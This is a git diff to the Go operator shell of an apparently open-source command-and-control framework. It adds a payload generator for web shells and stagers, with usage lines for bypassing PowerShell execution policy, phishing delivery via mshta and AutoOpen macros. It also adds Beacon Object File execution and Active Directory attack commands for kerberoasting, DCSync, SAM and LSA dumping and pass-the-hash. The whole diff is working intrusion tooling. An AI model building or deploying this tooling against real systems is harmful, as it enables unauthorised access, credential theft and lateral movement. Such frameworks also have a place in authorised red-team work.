@@ -11,6 +11,7 @@ import (
 	"time"
 
 	"github.com/phantom-c2/phantom/internal/db"
+	"github.com/phantom-c2/phantom/internal/payloads"
 	"github.com/phantom-c2/phantom/internal/protocol"
 	"github.com/phantom-c2/phantom/internal/server"
 	"github.com/phantom-c2/phantom/internal/util"
@@ -149,7 +150,14 @@ func (sh *Shell) executeAgentCmd(cmd string, args []string) {
 		sh.cmdKill()
 	case "tasks":
 		sh.cmdAgentTasks()
+	case "bof":
+		sh.cmdBOF(args)
 	default:
+		// Check if it's an AD command
+		if strings.HasPrefix(cmd, "ad-") {
+			sh.cmdAD(cmd, args)
+			return
+		}
 		// Treat as shell command
 		sh.cmdShell(append([]string{cmd}, args...))
 	}
@@ -346,25 +354,88 @@ func (sh *Shell) cmdTasks(args []string) {
 func (sh *Shell) cmdGenerate(args []string) {
 	fmt.Println()
 	fmt.Printf("  %s%sPayload Generator%s\n", colorBold, colorPurple, colorReset)
-	fmt.Printf("  %s─────────────────────────────────────────%s\n", colorDim, colorReset)
+	fmt.Printf("  %s─────────────────────────────────────────────────────────%s\n", colorDim, colorReset)
 	fmt.Println()
 
-	types := [][]string{
-		{"1", "Windows EXE (amd64)", "make agent-windows"},
-		{"2", "Linux Binary (amd64)", "make agent-linux"},
-		{"3", "Windows EXE Obfuscated", "make agent-garble-windows"},
-		{"4", "Web Shell (ASPX)", "Coming soon"},
-		{"5", "Web Shell (PHP)", "Coming soon"},
-		{"6", "Web Shell (JSP)", "Coming soon"},
-		{"7", "PowerShell Stager", "Coming soon"},
-		{"8", "Bash Stager", "Coming soon"},
-	}
+	fmt.Printf("  %sAgent Binaries (cross-compiled):%s\n", colorYellow, colorReset)
+	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate exe [listener_url]", colorReset, colorDim, "Windows EXE (amd64)", colorReset)
+	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate elf [listener_url]", colorReset, colorDim, "Linux Binary (amd64)", colorReset)
+	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate exe-garble [listener_url]", colorReset, colorDim, "Obfuscated Windows EXE", colorReset)
+	fmt.Println()
 
-	for _, t := range types {
-		fmt.Printf("  %s[%s]%s %-28s %s%s%s\n", colorCyan, t[0], colorReset, t[1], colorDim, t[2], colorReset)
+	fmt.Printf("  %sWeb Shells (stealthy, token-protected):%s\n", colorYellow, colorReset)
+	pTypes := payloads.ListPayloadTypes()
+	for _, pt := range pTypes {
+		fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, fmt.Sprintf("generate %s [listener_url]", pt.Type), colorReset, colorDim, pt.Desc, colorReset)
 	}
 	fmt.Println()
-	Info("Use 'make agent-windows LISTENER_URL=<url> SLEEP=10 JITTER=20' to build")
+
+	// Handle generation if args provided
+	if len(args) == 0 {
+		return
+	}
+
+	pType := strings.ToLower(args[0])
+	listenerURL := "https://127.0.0.1:443"
+	if len(args) > 1 {
+		listenerURL = args[1]
+	}
+
+	// Agent binaries
+	switch pType {
+	case "exe", "elf", "exe-garble":
+		Info("Use Makefile to build agent binaries:")
+		switch pType {
+		case "exe":
+			fmt.Printf("  %smake agent-windows LISTENER_URL=%s SLEEP=10 JITTER=20%s\n", colorCyan, listenerURL, colorReset)
+		case "elf":
+			fmt.Printf("  %smake agent-linux LISTENER_URL=%s SLEEP=10 JITTER=20%s\n", colorCyan, listenerURL, colorReset)
+		case "exe-garble":
+			fmt.Printf("  %smake agent-garble-windows LISTENER_URL=%s SLEEP=10 JITTER=20%s\n", colorCyan, listenerURL, colorReset)
+		}
+		return
+	}
+
+	// Web shells and stagers
+	cfg := payloads.PayloadConfig{
+		Type:        payloads.PayloadType(pType),
+		ListenerURL: listenerURL,
+		OutputPath:  "build/payloads",
+	}
+
+	outPath, err := payloads.Generate(cfg)
+	if err != nil {
+		Error("Failed to generate payload: %v", err)
+		return
+	}
+
+	Success("Payload generated: %s", outPath)
+
+	// Show access instructions for web shells
+	switch payloads.PayloadType(pType) {
+	case payloads.PayloadASPX, payloads.PayloadPHP, payloads.PayloadJSP:
+		token := fmt.Sprintf("%016x", hashString(listenerURL))
+		Info("Upload to target web server, then access with:")
+		fmt.Printf("  %scurl -X POST -H 'X-Debug-Token: %s' -d 'data=whoami' <url>%s\n", colorCyan, token, colorReset)
+	case payloads.PayloadPowerShell:
+		Info("Execute on target: powershell -ep bypass -f update.ps1")
+	case payloads.PayloadBash:
+		Info("Execute on target: bash update.sh")
+	case payloads.PayloadPython:
+		Info("Execute on target: python3 config.py")
+	case payloads.PayloadHTA:
+		Info("Deliver via phishing: mshta <url>/update.hta")
+	case payloads.PayloadVBA:
+		Info("Embed in Office document macro (AutoOpen)")
+	}
+}
+
+func hashString(s string) uint64 {
+	h := uint64(0)
+	for _, c := range s {
+		h = h*31 + uint64(c)
+	}
+	return h
 }
 
 func (sh *Shell) cmdEvents() {
@@ -400,6 +471,8 @@ func (sh *Shell) cmdAgentHelp() {
 		{"kill", "Terminate the agent"},
 		{"info", "Show agent details"},
 		{"tasks", "Show task history for this agent"},
+		{"bof <file> [args]", "Execute Beacon Object File"},
+		{"ad-*", "Active Directory commands (type 'ad-help')"},
 		{"back", "Return to main menu"},
 	}
 
@@ -573,6 +646,84 @@ func (sh *Shell) cmdAgentTasks() {
 			fmt.Printf("  %s\n", string(result.Output))
 		}
 	}
+}
+
+func (sh *Shell) cmdAD(cmd string, args []string) {
+	if cmd == "ad-help" {
+		sh.cmdADHelp()
+		return
+	}
+	sh.queueTask(protocol.TaskAD, append([]string{cmd}, args...), nil)
+}
+
+func (sh *Shell) cmdADHelp() {
+	fmt.Println()
+	fmt.Printf("  %s%sActive Directory Commands%s\n", colorBold, colorPurple, colorReset)
+	fmt.Printf("  %s─────────────────────────────────────────────────────────%s\n", colorDim, colorReset)
+	fmt.Println()
+
+	sections := []struct {
+		title string
+		cmds  [][]string
+	}{
+		{"Enumeration", [][]string{
+			{"ad-enum-domain", "Enumerate domain info (DCs, forest)"},
+			{"ad-enum-users [user]", "Enumerate domain users"},
+			{"ad-enum-groups [group]", "Enumerate groups and memberships"},
+			{"ad-enum-computers", "Enumerate domain computers"},
+			{"ad-enum-shares [target]", "Enumerate SMB shares"},
+			{"ad-enum-spns", "Enumerate SPNs (Kerberoastable)"},
+			{"ad-enum-gpo", "Enumerate Group Policy Objects"},
+			{"ad-enum-trusts", "Enumerate domain trusts"},
+			{"ad-enum-admins", "Enumerate Domain/Enterprise Admins"},
+			{"ad-enum-asrep", "Find AS-REP roastable accounts"},
+			{"ad-enum-delegation", "Find delegation configurations"},
+			{"ad-enum-laps", "Read LAPS passwords (if permitted)"},
+		}},
+		{"Attacks", [][]string{
+			{"ad-kerberoast", "Request TGS tickets for SPN accounts"},
+			{"ad-asreproast", "AS-REP Roast (no preauth accounts)"},
+			{"ad-dcsync <DOMAIN/user>", "DCSync password replication (DA required)"},
+		}},
+		{"Credential Access", [][]string{
+			{"ad-dump-sam", "Dump SAM database hives"},
+			{"ad-dump-lsa", "Dump LSA secrets"},
+			{"ad-dump-tickets", "Dump Kerberos tickets"},
+		}},
+		{"Lateral Movement", [][]string{
+			{"ad-psexec <target> <cmd>", "PsExec remote execution"},
+			{"ad-wmi <target> <cmd>", "WMI remote execution"},
+			{"ad-winrm <target> <cmd>", "WinRM remote execution"},
+			{"ad-pass-the-hash <t> <u> <h>", "Pass-the-Hash authentication"},
+		}},
+	}
+
+	for _, section := range sections {
+		fmt.Printf("  %s%s%s\n", colorYellow, section.title, colorReset)
+		for _, c := range section.cmds {
+			fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, c[0], colorReset, colorDim, c[1], colorReset)
+		}
+		fmt.Println()
+	}
+}
+
+func (sh *Shell) cmdBOF(args []string) {
+	if len(args) == 0 {
+		Error("Usage: bof <object-file> [args...]")
+		Info("Example: bof /path/to/whoami.o")
+		return
+	}
+
+	// Read BOF file
+	data, err := os.ReadFile(args[0])
+	if err != nil {
+		Error("Failed to read BOF file: %v", err)
+		return
+	}
+
+	bofArgs := args[1:]
+	sh.queueTask(protocol.TaskBOF, bofArgs, data)
+	Info("BOF size: %d bytes", len(data))
 }
 
 // onEvent handles real-time events from the server.
